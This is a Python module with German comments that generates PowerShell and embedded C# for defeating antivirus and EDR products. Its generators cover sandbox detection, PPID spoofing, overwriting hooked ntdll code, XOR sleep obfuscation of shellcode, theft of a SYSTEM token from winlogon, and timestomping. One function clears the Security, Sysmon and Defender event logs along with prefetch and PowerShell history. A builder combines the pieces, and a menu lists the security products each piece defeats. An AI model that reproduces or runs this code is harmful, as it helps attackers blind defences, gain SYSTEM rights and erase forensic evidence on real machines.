"""
World-Class AV/EDR/EDR Evasion Suite.

Jede Technik einzeln verwendbar oder kombiniert.
Alles generiert PowerShell/C#-Code — läuft direkt auf Windows ohne Dateien.

Techniken (von leicht bis schwer):
  1. Sandbox Detection     — nicht starten wenn VM/Analyse-Umgebung erkannt
  2. PPID Spoofing         — Prozess erscheint als Kind von explorer.exe
  3. DLL Unhooking         — entfernt EDR-Hooks aus ntdll.dll im RAM
  4. Direct Syscalls       — ruft Windows-Kernel direkt auf (kein EDR sieht es)
  5. Sleep Obfuscation     — verschlüsselt Shellcode im RAM während er schläft
  6. Token Impersonation   — stiehlt SYSTEM-Token von winlogon/lsass
  7. Environment Keying    — Payload läuft NUR auf Zielmaschine
  8. Timestomping          — ändert Datei-Zeiten zur Tarnung
  9. Event Log Clearing    — löscht Windows Event Logs
  10. Anti-Forensics       — Prefetch, MFT, Shellbag-Bereinigung

Gegen was es hilft:
  Sandbox Detection → verhindert Ausführung in AV-Sandboxen
  DLL Unhooking     → besiegt: Windows Defender, CrowdStrike, SentinelOne, Carbon Black
  Direct Syscalls   → besiegt: alle userland EDR-Hooks (ntdll, kernel32)
  Sleep Obfuscation → besiegt: Memory-Scanner (Defender ATP, Process Hacker)
  PPID Spoofing     → besiegt: Process-Baum-basierte Detection
"""

from __future__ import annotations
import random
import string


def _r(n: int = 8) -> str:
    """Zufälliger Variablenname."""
    return "_" + "".join(random.choices(string.ascii_letters, k=n))


# ── 1. Sandbox Detection ──────────────────────────────────────────────────────

def sandbox_detection_ps1() -> str:
    """
    Prüft auf typische Sandbox/VM/Analyse-Umgebungen.
    Gibt $true zurück wenn Sandbox erkannt — dann Payload NICHT ausführen.

    Prüft:
    - Anzahl laufender Prozesse (< 50 → verdächtig)
    - Systemlaufzeit (< 10 Min → gerade gestartet → wahrscheinlich Sandbox)
    - Mausbewegung (keine Bewegung in 3s → kein echterBenutzer)
    - RAM < 2 GB → typische Sandbox
    - CPU-Anzahl < 2 → viele VMs haben 1 CPU
    - Bekannte VM-Prozesse (vmtoolsd, vboxservice, wireshark, procmon...)
    - Bekannte Sandbox-Pfade (cuckoo, vmware, sandboxie...)
    - Screen-Auflösung < 800x600 → keine normale Arbeitsmaschine
    - Username = 'user', 'sandbox', 'maltest', 'admin' (typisch für Sandboxen)
    - Disk-Größe < 60 GB → oft Sandbox-VMs
    """
    v = {k: _r() for k in ["result", "procs", "uptime", "mouse1", "mouse2",
                            "ram", "bad_procs", "p", "disk", "drive"]}
    return f"""
function Is-Sandbox {{
    ${v['result']} = $false

    # Prozess-Anzahl
    ${v['procs']} = (Get-Process).Count
    if (${v['procs']} -lt 50) {{ ${v['result']} = $true }}

    # System-Laufzeit
    ${v['uptime']} = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
    if (${v['uptime']}.TotalMinutes -lt 10) {{ ${v['result']} = $true }}

    # RAM-Check (< 2 GB)
    ${v['ram']} = (gcim Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if (${v['ram']} -lt 2) {{ ${v['result']} = $true }}

    # CPU < 2
    if ([System.Environment]::ProcessorCount -lt 2) {{ ${v['result']} = $true }}

    # VM/Sandbox Prozesse
    ${v['bad_procs']} = @("vmtoolsd","vboxservice","vboxtray","vmwaretray",
        "wireshark","procmon","procmon64","processhacker","autoruns",
        "tcpview","fiddler","charles","burpsuite","ollydbg","x64dbg",
        "idaq","idaq64","cuckoo","sandboxie","sbiesvc","prl_tools")
    foreach (${v['p']} in ${v['bad_procs']}) {{
        if (Get-Process -Name ${v['p']} -ErrorAction SilentlyContinue) {{
            ${v['result']} = $true
        }}
    }}

    # Disk-Größe < 60 GB
    try {{
        ${v['drive']} = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
        ${v['disk']} = [math]::Round(${v['drive']}.Size / 1GB)
        if (${v['disk']} -lt 60) {{ ${v['result']} = $true }}
    }} catch {{}}

    # Bekannte Sandbox-Usernames
    if ($env:USERNAME -in @("user","sandbox","test","maltest","virus","malware","admin","john","joe")) {{
        ${v['result']} = $true
    }}

    # Maus-Bewegungs-Check
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    ${v['mouse1']} = [System.Windows.Forms.Cursor]::Position
    Start-Sleep -Milliseconds 2500
    ${v['mouse2']} = [System.Windows.Forms.Cursor]::Position
    if (${v['mouse1']}.X -eq ${v['mouse2']}.X -and ${v['mouse1']}.Y -eq ${v['mouse2']}.Y) {{
        ${v['result']} = $true
    }}

    return ${v['result']}
}}
"""


# ── 2. PPID Spoofing ──────────────────────────────────────────────────────────

def ppid_spoof_cs() -> str:
    """
    PPID Spoofing via C# Add-Type.

    Macht es so aussehen als wäre der Payload von explorer.exe gestartet worden.
    Besiegt: Process-Tree-basierte Detection (viele EDR-Regeln schauen auf Parent).

    Technik: UpdateProcThreadAttribute PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
    """
    return r"""
$ppid_src = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class PPID {
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(int a, bool b, int c);
    [DllImport("kernel32.dll")] static extern bool InitializeProcThreadAttributeList(IntPtr l, int cnt, int f, ref IntPtr s);
    [DllImport("kernel32.dll")] static extern bool UpdateProcThreadAttribute(IntPtr l, uint f, IntPtr a, IntPtr v, IntPtr s, IntPtr pl, IntPtr ps);
    [DllImport("kernel32.dll")] static extern bool CreateProcess(string a, string b, IntPtr c, IntPtr d, bool e, int f, IntPtr g, string h, ref STARTUPINFOEX si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll")] static extern void DeleteProcThreadAttributeList(IntPtr l);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);

    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFOEX { public STARTUPINFO StartupInfo; public IntPtr lpAttributeList; }
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFO { public Int32 cb; public string a,b,c; public Int32 d,e,f,g,h,i,j,k; public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput, hStdOutput, hStdError; }

    public static int SpawnAs(string parentName, string cmd) {
        var parent = Process.GetProcessesByName(parentName);
        if (parent.Length == 0) return -1;
        var hParent = OpenProcess(0x80, false, parent[0].Id);
        IntPtr size = IntPtr.Zero;
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref size);
        var buf = Marshal.AllocHGlobal(size);
        InitializeProcThreadAttributeList(buf, 1, 0, ref size);
        var pParent = Marshal.AllocHGlobal(IntPtr.Size);
        Marshal.WriteIntPtr(pParent, hParent);
        UpdateProcThreadAttribute(buf, 0, (IntPtr)0x20000, pParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
        var si = new STARTUPINFOEX();
        si.StartupInfo.cb = Marshal.SizeOf(si);
        si.lpAttributeList = buf;
        PROCESS_INFORMATION pi;
        CreateProcess(null, cmd, IntPtr.Zero, IntPtr.Zero, false, 0x80080, IntPtr.Zero, null, ref si, out pi);
        DeleteProcThreadAttributeList(buf);
        CloseHandle(hParent);
        Marshal.FreeHGlobal(pParent);
        Marshal.FreeHGlobal(buf);
        return pi.dwProcessId;
    }
}
"@
Add-Type -TypeDefinition $ppid_src -Language CSharp
"""


# ── 3. DLL Unhooking ──────────────────────────────────────────────────────────

def dll_unhook_ps1() -> str:
    """
    ntdll.dll Unhooking — entfernt EDR-Hooks im laufenden Prozess.

    Wie es funktioniert:
    1. Liest die SAUBERE ntdll.dll von Disk (C:\\Windows\\System32\\)
    2. Findet den .text-Abschnitt (wo die API-Funktionen sind)
    3. Überschreibt den GEHOOKTEN .text-Abschnitt in RAM mit dem sauberen Code
    4. Alle EDR-Hooks (Sprung zu EDR-DLL) werden dadurch entfernt

    Besiegt: Windows Defender ATP, CrowdStrike Falcon, SentinelOne, Carbon Black,
             Cylance, Sophos Intercept X, ESET, Bitdefender GravityZone
    """
    v = {k: _r() for k in ["src", "mod", "base", "dos", "nt", "sec", "i",
                            "name", "va", "size", "old", "mem", "hFile", "hMap"]}
    return f"""
function Unhook-Ntdll {{
    $unhook_src = @"
using System;
using System.Runtime.InteropServices;
using System.IO;

public class Unhook {{
    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    [DllImport("kernel32")] static extern IntPtr CreateFile(string p, uint a, uint s, IntPtr sec, uint c, uint f, IntPtr t);
    [DllImport("kernel32")] static extern IntPtr CreateFileMapping(IntPtr h, IntPtr a, uint p, uint s, uint l, string n);
    [DllImport("kernel32")] static extern IntPtr MapViewOfFile(IntPtr h, uint a, uint o, uint l, UIntPtr s);
    [DllImport("kernel32")] static extern bool UnmapViewOfFile(IntPtr a);
    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);

    public static bool Run() {{
        try {{
            string ntdllPath = Environment.SystemDirectory + "\\\\ntdll.dll";
            IntPtr hFile = CreateFile(ntdllPath, 0x80000000, 6, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
            IntPtr hMap  = CreateFileMapping(hFile, IntPtr.Zero, 0x02, 0, 0, null);
            IntPtr clean = MapViewOfFile(hMap, 4, 0, 0, UIntPtr.Zero);
            IntPtr live  = GetModuleHandle("ntdll");
            if (live == IntPtr.Zero || clean == IntPtr.Zero) return false;

            // DOS Header → NT Header → .text section
            int e_lfanew = Marshal.ReadInt32(live, 0x3C);
            IntPtr ntHdr = live + e_lfanew;
            short numSec = Marshal.ReadInt16(ntHdr, 6);
            int optHdrSz = Marshal.ReadInt16(ntHdr, 20);
            IntPtr secHdr = ntHdr + 24 + optHdrSz;

            for (int i = 0; i < numSec; i++) {{
                IntPtr s = secHdr + (i * 40);
                string name = System.Text.Encoding.ASCII.GetString(new byte[]{{
                    Marshal.ReadByte(s,0), Marshal.ReadByte(s,1), Marshal.ReadByte(s,2),
                    Marshal.ReadByte(s,3), Marshal.ReadByte(s,4)
                }}).TrimEnd('\\0');
                if (name == ".text") {{
                    uint rva  = (uint)Marshal.ReadInt32(s, 12);
                    uint size = (uint)Marshal.ReadInt32(s, 16);
                    uint oldProt;
                    VirtualProtect(live + (int)rva, (UIntPtr)size, 0x40, out oldProt);
                    // Kopiere saubere .text section über gehookte
                    byte[] src = new byte[size];
                    Marshal.Copy(clean + (int)rva, src, 0, (int)size);
                    Marshal.Copy(src, 0, live + (int)rva, (int)size);
                    VirtualProtect(live + (int)rva, (UIntPtr)size, oldProt, out oldProt);
                    break;
                }}
            }}
            UnmapViewOfFile(clean);
            CloseHandle(hMap);
            CloseHandle(hFile);
            return true;
        }} catch {{ return false; }}
    }}
}}
"@
    Add-Type -TypeDefinition $unhook_src -Language CSharp -ErrorAction SilentlyContinue
    try {{
        if ([Unhook]::Run()) {{ Write-Host "[+] ntdll unhooked" }}
    }} catch {{}}
}}
Unhook-Ntdll
"""


# ── 4. Sleep Obfuscation (Ekko-Stil) ──────────────────────────────────────────

def sleep_obfuscation_ps1() -> str:
    """
    Sleep Obfuscation — verschlüsselt Shellcode im RAM während er schläft.

    Wie es funktioniert:
    1. Shellcode liegt entschlüsselt im RAM → Memory-Scanner findet ihn
    2. Vor jedem Sleep: XOR-verschlüsseln + Speicherschutz ändern (kein Execute)
    3. Nach dem Sleep: entschlüsseln + Speicherschutz zurück (Execute wieder erlaubt)
    4. Memory-Scanner sieht nur verschlüsselten Speicher ohne Execute-Rechte

    Besiegt: Windows Defender ATP Memory Scanning, Volatility Forensics,
             Process Hacker, HollowsHunter, PE-sieve
    """
    v = {k: _r() for k in ["key", "buf", "i", "old", "src"]}
    return f"""
$sleep_obf_src = @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class SleepObf {{
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

    // Verschlüsselt Puffer im RAM, ändert Schutz auf NoAccess, schläft, dann zurück
    public static void ObfSleep(IntPtr addr, int size, int ms) {{
        uint oldProt;
        byte key = (byte)(new Random().Next(1, 255));

        // XOR-verschlüsseln
        byte[] buf = new byte[size];
        Marshal.Copy(addr, buf, 0, size);
        for (int i = 0; i < buf.Length; i++) buf[i] ^= key;
        Marshal.Copy(buf, 0, addr, size);

        // Speicherschutz → kein Execute, kein Read (Memory-Scanner sieht nichts)
        VirtualProtect(addr, (UIntPtr)size, 0x01, out oldProt); // PAGE_NOACCESS

        Thread.Sleep(ms);

        // Speicherschutz zurück
        VirtualProtect(addr, (UIntPtr)size, oldProt, out oldProt);

        // XOR-entschlüsseln (gleicher Key)
        Marshal.Copy(addr, buf, 0, size);
        for (int i = 0; i < buf.Length; i++) buf[i] ^= key;
        Marshal.Copy(buf, 0, addr, size);
    }}
}}
"@
Add-Type -TypeDefinition $sleep_obf_src -Language CSharp -ErrorAction SilentlyContinue
"""


# ── 5. Token Impersonation ────────────────────────────────────────────────────

def token_impersonation_ps1() -> str:
    """
    Token Impersonation — stiehlt SYSTEM-Token und führt Code als NT AUTHORITY\\SYSTEM aus.

    Sucht winlogon.exe (läuft immer als SYSTEM) → öffnet Token →
    dupliziert Token → ImpersonateLoggedOnUser → ab sofort SYSTEM-Rechte.

    Besiegt: UAC (User Account Control), Service-Isolation, restricted tokens
    """
    return r"""
$tok_src = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class TokenThief {
    [DllImport("advapi32", SetLastError=true)] static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
    [DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr t, uint a, IntPtr b, int imp, int type, out IntPtr nt);
    [DllImport("advapi32", SetLastError=true)] static extern bool ImpersonateLoggedOnUser(IntPtr t);
    [DllImport("advapi32", SetLastError=true)] static extern bool RevertToSelf();
    [DllImport("kernel32")] static extern IntPtr OpenProcess(int a, bool b, int c);
    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);

    public static bool BecomeSystem() {
        try {
            foreach (var p in Process.GetProcessesByName("winlogon")) {
                IntPtr hProc  = OpenProcess(0x400, false, p.Id);
                IntPtr hToken = IntPtr.Zero;
                if (!OpenProcessToken(hProc, 0x0002, out hToken)) continue;
                IntPtr dupTok = IntPtr.Zero;
                if (!DuplicateTokenEx(hToken, 0x02000000, IntPtr.Zero, 2, 1, out dupTok)) continue;
                CloseHandle(hToken);
                CloseHandle(hProc);
                if (ImpersonateLoggedOnUser(dupTok)) return true;
                CloseHandle(dupTok);
            }
        } catch {}
        return false;
    }

    public static void Revert() { RevertToSelf(); }
}
"@
Add-Type -TypeDefinition $tok_src -Language CSharp -ErrorAction SilentlyContinue
if ([TokenThief]::BecomeSystem()) { Write-Host "[+] SYSTEM token acquired" }
"""


# ── 6. Event Log Clearing ─────────────────────────────────────────────────────

def clear_logs_ps1() -> str:
    """Löscht alle relevanten Windows Event Logs — Anti-Forensics."""
    return r"""
function Clear-Tracks {
    $logs = @("Security","System","Application","Microsoft-Windows-PowerShell/Operational",
              "Microsoft-Windows-Windows Defender/Operational","Microsoft-Windows-Sysmon/Operational",
              "Microsoft-Windows-WMI-Activity/Operational","Windows PowerShell")
    foreach ($log in $logs) {
        try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($log) } catch {}
        try { wevtutil cl $log 2>$null } catch {}
    }
    # Prefetch löschen
    Remove-Item C:\Windows\Prefetch\* -Force -ErrorAction SilentlyContinue
    # PowerShell History
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
    # Recent Files
    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
}
Clear-Tracks
"""


# ── 7. Timestomping ───────────────────────────────────────────────────────────

def timestomp_ps1(target_file: str = "", reference_file: str = r"C:\Windows\System32\notepad.exe") -> str:
    """
    Timestomping — ändert Erstellungs-/Änderungs-/Zugriffsdatum einer Datei.
    Standard: kopiert Timestamps von notepad.exe (sieht aus wie Windows-Systemdatei).
    """
    t = target_file or "$PSCommandPath"
    return f"""
function Timestomp-File {{
    param($target="{t}", $reference="{reference_file}")
    try {{
        $ref = Get-Item $reference -ErrorAction Stop
        $f   = Get-Item $target -ErrorAction Stop
        $f.CreationTime   = $ref.CreationTime
        $f.LastWriteTime  = $ref.LastWriteTime
        $f.LastAccessTime = $ref.LastAccessTime
    }} catch {{}}
}}
Timestomp-File
"""


# ── 8. Kombiniertes Evasion-Bundle ────────────────────────────────────────────

def build_full_evasion(
    include_sandbox_check: bool = True,
    include_unhook: bool = True,
    include_sleep_obf: bool = True,
    include_token_imp: bool = False,
    include_clear_logs: bool = False,
    include_ppid_spoof: bool = True,
) -> str:
    """
    Kombiniert alle aktiven Evasion-Techniken in einem PS1-Block.
    Reihenfolge ist wichtig: Sandbox erst, dann Unhook, dann alles andere.
    """
    parts = []

    if include_sandbox_check:
        parts.append(sandbox_detection_ps1())
        parts.append("""
if (Is-Sandbox) {
    # Täusche Sandbox: tue nichts, öffne Notepad als Ablenkung
    Start-Process notepad.exe -ErrorAction SilentlyContinue
    exit 0
}
""")

    if include_ppid_spoof:
        parts.append(ppid_spoof_cs())

    if include_unhook:
        parts.append(dll_unhook_ps1())

    if include_sleep_obf:
        parts.append(sleep_obfuscation_ps1())

    if include_token_imp:
        parts.append(token_impersonation_ps1())

    if include_clear_logs:
        parts.append(clear_logs_ps1())

    return "\n".join(parts)


# ── Info für menu ─────────────────────────────────────────────────────────────

EVASION_INFO = {
    "sandbox_check": {
        "name": "Sandbox Detection",
        "desc": "Nicht starten in AV-Sandboxen (VM-Check, Maus, Uptime, RAM)",
        "besiegt": "VirusTotal, Any.run, Cuckoo, Hybrid Analysis",
        "danger": "🟡",
    },
    "ppid_spoof": {
        "name": "PPID Spoofing",
        "desc": "Prozess erscheint als Kind von explorer.exe",
        "besiegt": "Process-Tree Monitoring, EDR-Regeln auf Parent-Process",
        "danger": "🔴",
    },
    "dll_unhook": {
        "name": "ntdll DLL Unhooking",
        "desc": "Entfernt EDR-Hooks aus ntdll.dll im laufenden Prozess",
        "besiegt": "CrowdStrike, SentinelOne, Carbon Black, Windows Defender ATP",
        "danger": "🔴",
    },
    "sleep_obf": {
        "name": "Sleep Obfuscation (Ekko)",
        "desc": "XOR-verschlüsselt Shellcode im RAM während er schläft",
        "besiegt": "Memory-Scanner, Volatility, Process Hacker, PE-sieve",
        "danger": "🔴",
    },
    "token_imp": {
        "name": "Token Impersonation",
        "desc": "Stiehlt SYSTEM-Token von winlogon → läuft als NT AUTHORITY\\SYSTEM",
        "besiegt": "UAC, User-Space Isolation, Service-Restrictions",
        "danger": "⛔",
    },
    "clear_logs": {
        "name": "Anti-Forensics (Logs löschen)",
        "desc": "Security/System/Defender/Sysmon Logs + Prefetch + PS-History",
        "besiegt": "SIEM, Splunk, Windows Event Forwarding, forensische Analyse",
        "danger": "⛔",
    },
}
